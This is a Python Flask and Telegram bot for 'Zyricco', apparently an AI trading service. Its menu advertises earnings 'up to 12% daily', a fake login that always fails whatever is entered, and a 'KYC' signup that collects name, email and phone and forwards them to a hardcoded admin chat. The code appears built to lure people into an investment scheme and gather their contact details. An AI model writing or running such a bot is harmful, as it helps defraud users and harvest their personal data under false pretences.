from flask import Flask, request
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
import os

# States
CHOOSING, LOGIN_USERNAME, LOGIN_PASSWORD, KYC_NAME, KYC_EMAIL, KYC_PHONE = range(6)

# Telegram Bot Token
TOKEN = os.environ.get("BOT_TOKEN")
bot = Bot(token=TOKEN)

# Flask app
app = Flask(__name__)
dispatcher = Dispatcher(bot=bot, update_queue=None, workers=1, use_context=True)

# Inline button menu
def main_menu(update: Update, context: CallbackContext) -> int:
    keyboard = [
        [InlineKeyboardButton("Login", callback_data='login')],
        [InlineKeyboardButton("Signup (KYC)", callback_data='signup')],
        [InlineKeyboardButton("Our Services", callback_data='services')],
        [InlineKeyboardButton("Support", callback_data='support')],
        [InlineKeyboardButton("Cancel", callback_data='cancel')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.message:
        update.message.reply_text(
            "Welcome to Zyricco – Your AI-Powered Trading Partner!\n\nChoose an option:",
            reply_markup=reply_markup
        )
    elif update.callback_query:
        update.callback_query.edit_message_text(
            "Welcome to Zyricco – Your AI-Powered Trading Partner!\n\nChoose an option:",
            reply_markup=reply_markup
        )
    return CHOOSING

# Handle inline button clicks
def handle_buttons(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    query.answer()

    if query.data == 'login':
        context.bot.send_message(chat_id=query.message.chat_id, text="Enter your username:")
        return LOGIN_USERNAME
    elif query.data == 'signup':
        context.bot.send_message(chat_id=query.message.chat_id, text="Let's begin your KYC.\nWhat is your full name?")
        return KYC_NAME
    elif query.data == 'services':
        services_text = (
            "**Zyricco Services:**\n"
            "- AI Indicator: Real-time trend detection\n"
            "- GainX: Earn up to 12% daily\n"
            "- Funded Accounts: Trade with Zyricco capital\n"
            "- Account Management: Let our pros grow your account\n"
            "- AI Signals: Smart trading insights from our AI\n\n"
            "Contact support for more info."
        )
        query.edit_message_text(services_text, parse_mode='Markdown')
        return main_menu(update, context)
    elif query.data == 'support':
        query.edit_message_text("For support, contact us on Telegram: @zyricco_support")
        return main_menu(update, context)
    elif query.data == 'cancel':
        query.edit_message_text("Goodbye!")
        return ConversationHandler.END

# Login flow
def login_username(update: Update, context: CallbackContext) -> int:
    context.user_data['username'] = update.message.text
    update.message.reply_text("Now enter your password:")
    return LOGIN_PASSWORD

def login_password(update: Update, context: CallbackContext) -> int:
    update.message.reply_text("Login failed: Incorrect username or password.")
    return main_menu(update, context)

# Signup (KYC) flow
def kyc_name(update: Update, context: CallbackContext) -> int:
    context.user_data['name'] = update.message.text
    update.message.reply_text("Email address?")
    return KYC_EMAIL

def kyc_email(update: Update, context: CallbackContext) -> int:
    context.user_data['email'] = update.message.text
    update.message.reply_text("Phone number?")
    return KYC_PHONE

def kyc_phone(update: Update, context: CallbackContext) -> int:
    context.user_data['phone'] = update.message.text
    user = context.user_data
    summary = (
        f"New KYC Submission:\n"
        f"Name: {user['name']}\nEmail: {user['email']}\nPhone: {user['phone']}"
    )
    update.message.reply_text("KYC submitted successfully! We'll be in touch soon.")
    context.bot.send_message(chat_id=1841079821, text=summary)  # admin ID
    return main_menu(update, context)

# Cancel command
def cancel(update: Update, context: CallbackContext) -> int:
    update.message.reply_text("Action cancelled.")
    return main_menu(update, context)

# Conversation handler
conv_handler = ConversationHandler(
    entry_points=[CommandHandler('start', main_menu), CommandHandler('menu', main_menu)],
    states={
        CHOOSING: [CallbackQueryHandler(handle_buttons)],
        LOGIN_USERNAME: [MessageHandler(Filters.text & ~Filters.command, login_username)],
        LOGIN_PASSWORD: [MessageHandler(Filters.text & ~Filters.command, login_password)],
        KYC_NAME: [MessageHandler(Filters.text & ~Filters.command, kyc_name)],
        KYC_EMAIL: [MessageHandler(Filters.text & ~Filters.command, kyc_email)],
        KYC_PHONE: [MessageHandler(Filters.text & ~Filters.command, kyc_phone)],
    },
    fallbacks=[CommandHandler('cancel', cancel)],
)

dispatcher.add_handler(conv_handler)

# Webhook
@app.route("/", methods=["POST"])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dispatcher.process_update(update)
    return "ok"

# Home
@app.route("/", methods=["GET"])
def home():
    return "Zyricco Bot is running!"

# Run app
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
